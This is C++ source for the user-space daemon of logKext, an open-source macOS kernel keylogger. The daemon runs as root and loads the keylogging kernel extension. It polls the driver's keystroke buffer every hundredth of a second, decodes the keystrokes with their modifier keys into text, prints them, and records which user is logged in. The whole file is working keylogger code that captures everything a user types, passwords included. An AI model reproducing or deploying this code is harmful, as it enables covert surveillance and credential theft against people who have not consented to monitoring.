/*
	logKextDaemon.cpp
	logKext

   Copyright 2007 Braden Thomas

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

#include <unistd.h>
#include <sys/mount.h>
#include <openssl/blowfish.h>
#include <openssl/md5.h>
#include <openssl/rand.h>
#include <syslog.h>

#include <sys/stat.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>
#include <SystemConfiguration/SystemConfiguration.h>

#include "KeyLogCommon.h"
#include "KeyLogTransfer.h"

#define TIME_TO_SLEEP		0.01
#define PATHNAME_PREF_KEY	CFSTR("Pathname")
#define ENCRYPT_PREF_KEY	CFSTR("Encrypt")
#define PASSWORD_PREF_KEY	CFSTR("Password")
#define MINMEG_PREF_KEY		CFSTR("MinMeg")
#define SYSTEM_KEYCHAIN		"/Library/Keychains/System.keychain"
#define SECRET_SERVICENAME	"logKextPassKey"

/**********Function Declarations*************/

int			load_kext();
int mungeString(CFStringRef someString);
bool		outOfSpace(CFStringRef);
void		stamp_file(const char*);
bool		fileExists(CFStringRef);
void		makeEncryptKey(CFStringRef pass);

void		updateKeymap();

void		getBufferSizeAndKeys(int *size,int *keys);
CFStringRef	getBuffer();
bool		connectToKext();

void		DaemonTimerCallback( CFRunLoopTimerRef timer, void *info );
int			InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned);
void		LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info);

/****** Globals ********/
io_connect_t		userClient;
CFDictionaryRef		keymap;

CFBooleanRef		showMods;
CFStringRef			pathName;

/****** Main ********/

int main()
{
	if (geteuid())
	{
		syslog(LOG_ERR,"Error: Daemon must run as root.");
		exit(geteuid());
	}

/*********Check keymap**********/

	updateKeymap();

/*********Connect to kernel extension**********/
	
	if (!connectToKext())
	{
		if (load_kext())
		{
			stamp_file("Could not load KEXT");
			return 1;
		}
		if (!connectToKext())
		{
			stamp_file("Could not connect with KEXT");
			return 1;
		}
	}
	sleep(1);		// just a little time to let the kernel notification handlers finish
	
	stamp_file("LogKext Daemon starting up");
	// stamp login file with initial user
	LoginLogoutCallBackFunction(NULL, NULL, NULL);
	
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	
/*********Create Daemon Timer source**********/

	CFRunLoopTimerContext timerContext = { 0 };
	CFRunLoopSourceRef loginLogoutSource;	
    if (InstallLoginLogoutNotifiers(&loginLogoutSource))
		syslog(LOG_ERR,"Error: could not install login notifier");
	else
		CFRunLoopAddSource(CFRunLoopGetCurrent(),loginLogoutSource, kCFRunLoopDefaultMode);

	CFRunLoopTimerRef daemonTimer = CFRunLoopTimerCreate(NULL, 0, TIME_TO_SLEEP, 0, 0, DaemonTimerCallback, &timerContext);
	CFRunLoopAddTimer(CFRunLoopGetCurrent(), daemonTimer, kCFRunLoopCommonModes);

	
	CFRunLoopRun();
	
	stamp_file("Server error: closing Daemon");
}


void DaemonTimerCallback( CFRunLoopTimerRef timer, void *info )
{
/*********Wait if not logging**********/

	Boolean validKey;
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	CFBooleanRef isLogging = (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		isLogging = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Logging"),isLogging,PREF_DOMAIN);
	}
	
	if (!CFBooleanGetValue(isLogging))
		return;
	
/********* Check the buffer **********/

	int buffsize=0;
	int keys=0;
	getBufferSizeAndKeys(&buffsize,&keys);

	#ifdef DEBUG
		syslog(LOG_ERR,"Buffsize %d, Keys %d.",buffsize,keys);	
	#endif

	if (!keys)			// no keyboards logged
		return;

	//if (buffsize < MAX_BUFF_SIZE/10)
	//	return;

/********* Get the buffer **********/

	CFStringRef the_buffer = getBuffer();
	
    const char * str =CFStringGetCStringPtr(the_buffer, kCFStringEncodingMacRoman);
    if ( str != NULL )
    printf("%s\n", str);
/********* Check defaults/file **********/		

	CFRelease(the_buffer);
	
	return;
}

int load_kext()
{
    int		childStatus=0;
    pid_t	pid;

    if (!(pid = fork()))
	{
		execl("/sbin/kextload", "/sbin/kextload", "-b", KEXT_ID, NULL);
		_exit(0);
	}
	waitpid(pid, &childStatus, 0);
	return childStatus;
}

void updateKeymap()
{
	CFReadStreamRef	readStream;

	if (!fileExists(CFSTR(KEYMAP_PATH)))
	{
		stamp_file("Error: Keymap file is missing");
		keymap = NULL;
		return;
	}
	
	readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,CFSTR(KEYMAP_PATH),kCFURLPOSIXPathStyle,false));
	if (!readStream||!(CFReadStreamOpen(readStream)))
	{
		stamp_file("Error: Can't open keymap file");
		keymap = NULL;
		return;
	}
	keymap = (CFDictionaryRef)CFPropertyListCreateFromStream(kCFAllocatorDefault,readStream,0,kCFPropertyListImmutable,NULL,NULL);
	CFReadStreamClose(readStream);
	if (!keymap)
	{
		stamp_file("Error: Can't read keymap file");
		return;
	}
	
	Boolean validKey;
	showMods = (CFPreferencesGetAppBooleanValue(CFSTR("Mods"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		showMods = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Mods"),showMods,PREF_DOMAIN);
	}
}

bool fileExists(CFStringRef pathName)
{
	struct stat fileStat;
	if (stat(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileStat))
		return false;
	return true;
}

void stamp_file(const char * inStamp)
{
	time_t the_time;
	char timeBuf[32]={0};
	time(&the_time);
	ctime_r(&the_time, timeBuf);
	char* newlin=strchr(timeBuf, '\n');
	if (newlin)
		*newlin=0;
	printf("![%s :%s]\n", inStamp, timeBuf);
	
}

bool connectToKext()
{
    mach_port_t		masterPort;
    io_service_t	serviceObject = 0;
    io_iterator_t 	iterator;
    CFDictionaryRef	classToMatch;
	Boolean			result = true;	// assume success
    
    // return the mach port used to initiate communication with IOKit
    if (IOMasterPort(MACH_PORT_NULL, &masterPort) != KERN_SUCCESS)
		return false;
    
    classToMatch = IOServiceMatching( "com_prebeg_kext_KeyLog" );
    if (!classToMatch)
		return false;

    // create an io_iterator_t of all instances of our driver's class that exist in the IORegistry
    if (IOServiceGetMatchingServices(masterPort, classToMatch, &iterator) != KERN_SUCCESS)
		return false;
			    
    // get the first item in the iterator.
    serviceObject = IOIteratorNext(iterator);
    
    // release the io_iterator_t now that we're done with it.
    IOObjectRelease(iterator);
    
    if (!serviceObject){
		result = false;
		goto bail;
    }
	
	// instantiate the user client
	if(IOServiceOpen(serviceObject, mach_task_self(), 0, &userClient) != KERN_SUCCESS) {
		result = false;
		goto bail;
    }
	
bail:
	if (serviceObject) {
		IOObjectRelease(serviceObject);
	}
	
    return result;
}

void getBufferSizeAndKeys(int* size, int* keys)
{
	kern_return_t kernResult;
	
	uint64_t	scalarO_64[2];
	uint32_t	outputCnt = 2;

	kernResult = IOConnectCallScalarMethod(userClient, // mach port
										   klogKextBuffandKeys,
										   NULL,
										   0,
										   scalarO_64,
										   &outputCnt);
	
	*size=scalarO_64[0];
	*keys=scalarO_64[1];
 
	return;
}

CFStringRef getBuffer()
{
	kern_return_t kernResult;
	bufferStruct myBufStruct;
	size_t structSize = sizeof(myBufStruct);
	
	kernResult = IOConnectCallMethod(userClient,
									 klogKextBuffer,
									 NULL,
									 0,
									 NULL,
									 NULL,
									 NULL,
									 NULL,
									 &myBufStruct,
									 &structSize);
	
	CFDataRef result = CFDataCreate(kCFAllocatorDefault,myBufStruct.buffer,myBufStruct.bufLen);
	CFMutableStringRef decodedData = CFStringCreateMutable(kCFAllocatorDefault,0);
	
	if (!keymap)
		return decodedData;
	
	CFDictionaryRef flagsDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Flags"));
	if (!flagsDict)
		return decodedData;
	CFDictionaryRef ucDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Uppercase"));
	if (!ucDict)
		return decodedData;
	CFDictionaryRef lcDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Lowercase"));
	if (!lcDict)
		return decodedData;

    CFDictionaryRef spDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("SpecialKeys"));
	if (!spDict)
		return decodedData;

    
	CFNumberFormatterRef myNF = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
	
	for (int i=0; i<CFDataGetLength(result);i+=2)
	{
		u_int16_t curChar;
		CFDataGetBytes(result,CFRangeMake(i,2),(UInt8*)&curChar);
		bool isUpper = false;
		
		if (CFBooleanGetValue(showMods))
		{
			char flagTmp = (curChar >> 11);
			
			if (flagTmp & 0x01)
            {
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x01")));
                CFStringAppend(decodedData,CFSTR("+"));
            }

			if (flagTmp & 0x02)
			{
                CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x02")));
                CFStringAppend(decodedData,CFSTR("+"));
            }

			if (flagTmp & 0x04)
			{
                CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x04")));
                CFStringAppend(decodedData,CFSTR("+"));
            }

			if (flagTmp & 0x08)
			{
                CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x08")));
                CFStringAppend(decodedData,CFSTR("+"));
            }
				
			if (flagTmp & 0x10)
            	isUpper = true;
		}

		curChar &= 0x07ff;		
		CFStringRef keyChar = CFNumberFormatterCreateStringWithValue(kCFAllocatorDefault,myNF,kCFNumberShortType,&curChar);
		CFStringRef text;

		if (isUpper)
			text = (CFStringRef)CFDictionaryGetValue(ucDict,keyChar);
		else
			text = (CFStringRef)CFDictionaryGetValue(lcDict,keyChar);		
		
		if (text)
		{
			CFStringAppend(decodedData,text);
		}
		else
        {
            text = (CFStringRef)CFDictionaryGetValue(spDict, keyChar);
            if ( text )
            {
                if ( isUpper )
                {
                    CFStringAppend(decodedData, (CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x10")));
                    CFStringAppend(decodedData, CFSTR("+"));
                }
                CFStringAppend(decodedData,text);
                
            }
            else
            {
                CFStringAppend(decodedData, CFSTR("Unknown key:"));
                CFStringAppend(decodedData, keyChar);
                syslog(LOG_ERR,"Unmapped key %d",curChar);
            }
        }
	}
    
    return decodedData;
}

void LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info)
{
    CFStringRef	consoleUserName;
    consoleUserName = SCDynamicStoreCopyConsoleUser(store, NULL, NULL);
    if (consoleUserName != NULL)
    {
		printf("User '%s' has logged in\n", CFStringGetCStringPtr(consoleUserName, kCFStringEncodingMacRoman));
        CFRelease(consoleUserName);
    }
}

int InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned)
{
    SCDynamicStoreContext DynamicStoreContext = { 0, NULL, NULL, NULL, NULL };
    SCDynamicStoreRef DynamicStoreCommunicationMechanism = NULL;
    CFStringRef KeyRepresentingConsoleUserNameChange = NULL;
    CFMutableArrayRef ArrayOfNotificationKeys;
    Boolean Result;

    *RunloopSourceReturned = NULL;
    DynamicStoreCommunicationMechanism = SCDynamicStoreCreate(NULL, CFSTR("KeyLog"), LoginLogoutCallBackFunction, &DynamicStoreContext);

    if (DynamicStoreCommunicationMechanism == NULL)
        return(-1); //unable to create dynamic store.

    KeyRepresentingConsoleUserNameChange = SCDynamicStoreKeyCreateConsoleUser(NULL);
    if (KeyRepresentingConsoleUserNameChange == NULL)
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        return(-2);
    }

    ArrayOfNotificationKeys = CFArrayCreateMutable(NULL, (CFIndex)1, &kCFTypeArrayCallBacks);
    if (ArrayOfNotificationKeys == NULL)
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        CFRelease(KeyRepresentingConsoleUserNameChange);
        return(-3);
    }
    CFArrayAppendValue(ArrayOfNotificationKeys, KeyRepresentingConsoleUserNameChange);

     Result = SCDynamicStoreSetNotificationKeys(DynamicStoreCommunicationMechanism, ArrayOfNotificationKeys, NULL);
     CFRelease(ArrayOfNotificationKeys);
     CFRelease(KeyRepresentingConsoleUserNameChange);

     if (Result == FALSE) //unable to add keys to dynamic store.
     {
        CFRelease(DynamicStoreCommunicationMechanism);
        return(-4);
     }

	*RunloopSourceReturned = SCDynamicStoreCreateRunLoopSource(NULL, DynamicStoreCommunicationMechanism, (CFIndex) 0);
    return(0);
}